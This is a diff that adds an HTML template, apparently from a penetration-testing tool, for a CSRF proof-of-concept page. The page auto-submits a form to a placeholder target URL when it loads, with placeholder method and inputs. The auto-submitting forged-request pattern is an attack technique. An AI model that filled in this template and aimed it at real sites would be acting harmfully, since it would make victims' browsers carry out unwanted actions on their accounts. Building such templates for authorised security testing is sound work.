@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>CSRF Proof of Concept</title>
+    <script>
+        function submitForm() {{
+            var form = document.getElementById('csrf-form');
+            if (form) {{
+                form.submit();
+            }}
+        }}
+
+        window.addEventListener('load', function () {{
+            submitForm();
+        }});
+    </script>
+</head>
+<body>
+    <h1>CSRF Proof of Concept</h1>
+    <p>If the page does not auto-submit, click the button below.</p>
+    <form id="csrf-form" action="{action_url}" method="{method}">
+        {inputs}
+        <noscript>
+            <p>JavaScript is disabled. Click the button below to submit the form manually.</p>
+        </noscript>
+        <button type="submit">Submit request</button>
+    </form>
+</body>
+</html>
